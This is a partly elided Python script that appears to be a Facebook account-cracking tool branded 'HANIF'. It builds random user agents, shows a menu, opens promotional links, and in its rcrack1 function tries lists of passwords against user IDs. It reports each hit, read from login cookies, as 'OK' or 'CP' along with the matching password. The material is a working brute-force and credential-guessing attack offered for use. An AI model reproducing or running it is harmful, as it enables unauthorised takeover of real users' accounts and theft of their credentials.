...
for xd in range(10000):
    ...
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
os.system('xdg-open https://github.com/hanif-x')
logo = ("""
\033[1;36m      ██████╗░██████╗░███████╗
\033[1;36m      ██╔══██╗██╔══██╗██╔════╝
\033[1;36m      ██║░░██║██████╦╝█████╗░░
...
class Main:
    def __init__(self):
        ...
        print("\033[1;32m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        HANIF =input(" [?] Choose : ")
        os.system('xdg-open https://www.facebook.com/share/g/ySJtQ8aSVcLnzzmh/')
        if HANIF in ["1", "01"]:
            num()
        if HANIF in ["2","02"]:
            gml()
...
def rcrack1(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write('\r[\033[1;92mHANIF\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
    ...
    'user-agent': pro,}
            ...
            if 'c_user' in log_cookies:
                ...
                if 'LOCK' in res:
                    ...
                    print(f'  \r\033[1;92m  [HANIFs-OK] '+uid+' • '+ps+'\33[0;92m')
                ...
                cid = coki[82:97]
                print(f"\x1b[38;5;196m[HANIFs-CP] {cid} | {ps}")
                ...
                continue
        loop+=1
        #sys.stdout.write(f'\r\033[m[HANIF] \033[1;92m%s\033[m |\033[m[\033[mOK:\033[1;92m%s\033[m] '%(loop,len(oks))),
        #sys.stdout.flush()
    except:
        pass
Main()
